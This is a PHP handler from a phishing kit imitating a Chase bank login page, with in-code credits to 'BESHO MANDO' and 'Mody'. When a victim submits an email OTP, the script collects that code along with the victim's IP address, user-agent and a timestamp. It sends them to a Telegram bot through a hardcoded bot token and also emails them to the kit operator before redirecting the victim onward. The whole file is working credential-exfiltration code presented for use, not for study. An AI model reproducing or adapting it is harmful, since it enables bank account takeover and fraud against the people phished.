<?php

// Get the user's IP address
$ip = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];

// Start a session
session_start();

// Check if 'logId' session variable is set



// Check if 'emlpass' is set in the POST request
if (isset($_POST['emlpass'])) {
    // Include the 'to.php' file
    include 'to.php';

    // Get the OTP from the POST request
    $OTP = $_POST['emlpass'];

    // Prepare the email message
    $message = "<b>📧 OTP Email Access.</b>\n";
    $message .= "<b>📭OTP-EMAIL:</b> <code>$OTP</code>\n";
    $message .= "<b>🌐 IP Address:</b> " . $ip . "\n";
    $message .= "<b>⌚ Time:</b> " . date("Y-m-d H:i:s") . "\n";
    $message .= "<b>🖥 User-Agent:</b> " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    $message .= "<b>🔍 CHASE OTP EMAIL ACCESS BY BESHO MANDO📭</b> \n";

    // Set the email subject
    $subject = "Chase LOGIN";

    // Set the email headers
    $headers = "From: Mody@BOA" . rand(1, 99) . "Mody.V1 \r\n";

    // Send the message to Telegram using file_get_contents
    file_get_contents("https://api.telegram.org/bot6024595519:AAHQcscrgYlrL2vxuh_mXG4FHKugXRA4Rww/sendMessage?chat_id=" . $chatid . "&parse_mode=HTML&text=" . urlencode($message));

    // Send the email
    $done = mail($toemail, $subject, $message, $headers);

    // Redirect to './red10.php'
    header('Location: ./red10.php');
}
?>
